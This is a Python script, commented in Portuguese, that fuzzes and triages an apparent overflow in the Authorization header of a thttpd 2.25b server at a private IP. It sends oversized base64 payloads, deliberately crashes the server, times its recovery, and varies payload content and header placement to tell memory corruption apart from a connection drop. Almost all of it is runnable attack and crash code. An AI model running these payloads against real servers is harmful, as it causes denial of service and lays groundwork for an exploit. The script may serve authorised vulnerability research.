#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
thttpd 2.25b Auth Overflow — Análise de Crash
Target: 192.168.1.254:443

Este script faz uma análise granular do crash no header Authorization.
Objetivo: determinar se é um crash real (memory corruption) ou apenas
um drop de conexão por limite de tamanho.
"""

import socket
import ssl
import time
import struct
import base64

TARGET = "192.168.1.254"
PORT = 443
TIMEOUT = 10
RECOVERY_WAIT = 5  # segundos para servidor recuperar


def send_request(auth_b64_bytes):
    """Envia request com Authorization header custom"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    req = (
        b"GET / HTTP/1.0\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"Authorization: Basic " + auth_b64_bytes + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )

    try:
        sock = socket.create_connection((TARGET, PORT), timeout=TIMEOUT)
        ssock = context.wrap_socket(sock, server_hostname=TARGET)
        ssock.sendall(req)

        response = b""
        ssock.settimeout(3.0)
        try:
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        ssock.close()

        # Parse status
        header_end = response.find(b"\r\n")
        if header_end > 0:
            status_line = response[:header_end].decode('latin-1', errors='replace')
            if " " in status_line:
                try:
                    status = int(status_line.split()[1])
                    return status, response
                except:
                    pass
        return 0, response  # Resposta sem status HTTP válido

    except ConnectionResetError:
        return -3, b"Connection reset by peer"
    except ConnectionRefusedError:
        return -2, b"Connection refused"
    except socket.timeout:
        return -1, b"Timeout"
    except Exception as e:
        return -4, str(e).encode()


def check_alive():
    """Verifica se o servidor ainda responde requests normais"""
    status, body = send_request(b"dXNlcjpwYXNz")  # user:pass em base64
    return status >= 0


def test_incremental():
    """Testa tamanhos incrementais de 100 bytes entre 4KB e 8KB"""
    print("=" * 70)
    print("  TESTE INCREMENTAL: 4096 → 8192 bytes (step 100)")
    print("=" * 70)

    results = []

    for size in range(4096, 8193, 100):
        # Gerar base64 de tamanho exato
        raw_len = (size * 3) // 4
        raw = b"A" * raw_len
        b64 = base64.b64encode(raw)
        # Ajustar para tamanho exato
        if len(b64) > size:
            b64 = b64[:size]
        while len(b64) < size:
            b64 += b"A"

        print(f"  {size:5d} bytes... ", end="", flush=True)
        status, body = send_request(b64)

        alive = check_alive()

        if status == 200:
            result = "200 OK"
        elif status == 401:
            result = "401 Auth"
        elif status == 400:
            result = "400 Bad Request"
        elif status == 414:
            result = "414 URI Too Long"
        elif status == -1:
            result = "TIMEOUT"
        elif status == -2:
            result = "REFUSED"
        elif status == -3:
            result = "RESET"
        elif status == 0:
            result = "EMPTY RESP"
        else:
            result = f"ERR {status}"

        marker = "💀" if not alive else " "
        print(f"{result:15s} {marker} {'SERVIDOR MORTO' if not alive else 'vivo'}")

        results.append((size, status, alive))

        if not alive:
            print(f"\n[!] SERVIDOR MORREU em {size} bytes!")
            print(f"    Aguardando {RECOVERY_WAIT}s para recuperação...")
            time.sleep(RECOVERY_WAIT)
            if check_alive():
                print("    → Servidor recuperado (watchdog/restart)")
            else:
                print("    → Servidor AINDA MORTO! Abortando.")
                break

        time.sleep(0.2)

    return results


def test_crash_recovery():
    """Testa se o crash é recuperável"""
    print("\n" + "=" * 70)
    print("  TESTE DE RECUPERAÇÃO PÓS-CRASH")
    print("=" * 70)

    # Enviar payload crashante (8KB)
    raw = b"A" * 6000
    b64 = base64.b64encode(raw)

    print("\n[*] Enviando payload crashante (8KB)...")
    status, body = send_request(b64)
    print(f"    Resultado: {status}")

    # Testar recuperação em intervalos
    for wait in [1, 2, 3, 5, 10]:
        print(f"[*] Aguardando {wait}s...", end=" ")
        time.sleep(wait)
        if check_alive():
            print("SERVIDOR VIVO!")
            print(f"    → Recuperação em ~{wait}s (watchdog ativo)")
            return wait
        else:
            print("ainda morto...")

    print("[!] Servidor NÃO recuperou em 21s. Crash permanente!")
    return None


def test_different_chars():
    """Testa se o crash depende do conteúdo ou apenas do tamanho"""
    print("\n" + "=" * 70)
    print("  TESTE DE DEPENDÊNCIA DE CONTEÚDO")
    print("=" * 70)

    size = 8192
    test_cases = [
        ("A's only", b"A" * size),
        ("0's only", b"0" * size),
        ("Mixed alphanumeric", b"aB1cD2" * (size // 6)),
        ("Valid base64 chars", b"+/" * (size // 2)),
        ("Null bytes", b"\x00" * size),
        ("High bytes", b"\xff" * size),
    ]

    for name, raw in test_cases:
        # Ajustar para tamanho exato
        raw = raw[:size]
        while len(raw) < size:
            raw += b"A"

        b64 = base64.b64encode(raw)
        if len(b64) > size:
            b64 = b64[:size]

        print(f"  {name:25s}... ", end="", flush=True)
        status, body = send_request(b64)
        alive = check_alive()

        if status == -1:
            print(f"TIMEOUT {'💀' if not alive else ''}")
        elif status == -3:
            print(f"RESET {'💀' if not alive else ''}")
        elif status == 401:
            print("401 OK")
        else:
            print(f"{status} {'💀' if not alive else ''}")

        if not alive:
            print("    → Servidor morreu, aguardando recuperação...")
            time.sleep(5)
            if not check_alive():
                print("    → Ainda morto! Abortando teste de conteúdo.")
                break

        time.sleep(0.5)


def test_header_vs_body():
    """Testa se o crash é específico do header ou do tamanho total do request"""
    print("\n" + "=" * 70)
    print("  TESTE: Header vs Body Size")
    print("=" * 70)

    # Teste A: Header grande, body pequeno
    print("\n[*] Teste A: Authorization header de 8KB + body 0 bytes")
    raw = b"A" * 6000
    b64 = base64.b64encode(raw)
    status, body = send_request(b64)
    print(f"    Resultado: {status}")
    time.sleep(2)

    # Teste B: Outro header grande (User-Agent)
    print("[*] Teste B: User-Agent header de 8KB (não auth)")
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    req = (
        b"GET / HTTP/1.0\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"User-Agent: " + b"A" * 8192 + b"\r\n"
        b"Connection: close\r\n\r\n"
    )

    try:
        sock = socket.create_connection((TARGET, PORT), timeout=TIMEOUT)
        ssock = context.wrap_socket(sock, server_hostname=TARGET)
        ssock.sendall(req)
        response = b""
        ssock.settimeout(3.0)
        try:
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        ssock.close()
        print(f"    Resultado: resposta recebida ({len(response)} bytes)")
    except Exception as e:
        print(f"    Resultado: {e}")

    time.sleep(2)

    # Teste C: Múltiplos headers pequenos somando 8KB
    print("[*] Teste C: 16 headers de 512 bytes cada (total 8KB)")
    req = b"GET / HTTP/1.0\r\nHost: " + TARGET.encode() + b"\r\n"
    for i in range(16):
        req += f"X-Header-{i}: ".encode() + b"A" * 500 + b"\r\n"
    req += b"Connection: close\r\n\r\n"

    try:
        sock = socket.create_connection((TARGET, PORT), timeout=TIMEOUT)
        ssock = context.wrap_socket(sock, server_hostname=TARGET)
        ssock.sendall(req)
        response = b""
        ssock.settimeout(3.0)
        try:
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        ssock.close()
        print(f"    Resultado: resposta recebida ({len(response)} bytes)")
    except Exception as e:
        print(f"    Resultado: {e}")


def main():
    print("=" * 70)
    print("  thttpd 2.25b — Análise Granular do Auth Overflow")
    print(f"  Target: {TARGET}:{PORT}")
    print("=" * 70)

    # Verificar conectividade inicial
    print("\n[*] Check inicial...")
    if not check_alive():
        print("[FATAL] Servidor não responde!")
        return
    print("[+] Servidor vivo.")

    # Rodar testes
    results = test_incremental()

    recovery_time = test_crash_recovery()

    test_different_chars()

    test_header_vs_body()

    # Resumo
    print("\n" + "=" * 70)
    print("  RESUMO")
    print("=" * 70)

    # Encontrar o ponto de transição
    transition = None
    for i, (size, status, alive) in enumerate(results):
        if status < 0 or not alive:
            transition = size
            break

    if transition:
        print(f"  Ponto de transição: ~{transition} bytes")
    else:
        print(f"  Nenhuma transição encontrada até 8KB")

    if recovery_time:
        print(f"  Recuperação pós-crash: {recovery_time}s (watchdog ativo)")
        print(f"  → O crash NÃO é permanente. Provavelmente stack overflow")
        print(f"    em processo filho (fork-per-request) ou timeout.")
    else:
        print(f"  Recuperação: NENHUMA (crash permanente)")
        print(f"  → Corrupção de heap ou overwrite de estrutura global!")

    print("=" * 70)


if __name__ == "__main__":
    main()
